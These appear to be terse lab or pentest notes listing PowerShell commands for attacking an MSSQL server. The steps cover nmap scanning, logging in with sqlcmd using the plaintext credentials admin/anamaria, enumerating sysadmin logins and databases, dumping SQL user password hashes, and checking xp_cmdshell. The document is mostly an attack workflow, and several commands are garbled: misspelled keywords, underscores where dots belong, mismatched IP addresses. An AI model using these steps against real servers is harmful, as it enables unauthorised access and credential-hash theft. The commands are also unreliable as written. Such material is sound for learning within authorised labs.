In Powershell:
>Scanning full range using nmap to discover target machine IP address
>`nmap 10.5.17.0/20 --open`
>Running nmap ms-sql-info script to get more information about the target SQL Server
>`nmap --script ms-sql-info -p1433 10.2.4.6`
>Connecting to the target MSSQL machine using sqlcmd utility
>`sqlcmd -s 10.5.17.68 -U admin -P anamaria`
>Checking MSSQL version details
>1>`select @@version`
>2>`go`

>Checcking current database
>1>`select db_name();`
>2>`go`

>Checking target machine hostname
>1>`select HOST_NAME();`
>2>`go`

>Extracting all sys logins
>1>`select loginname from syslogin wher sysadmin = 1;`
>2>`go`

>Extracting all available databases
>1>`select name from sys_databases;`
>2>`go`

>Extracting SQL users hashes
>1>`select name, password_hash FROM master_sys_sql_logins;`
>2>`go`

>Getting details of xp_cmdshell
>1>`select name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys_configurations WHERE name = 'xp_cmdshell';`
>2>`go`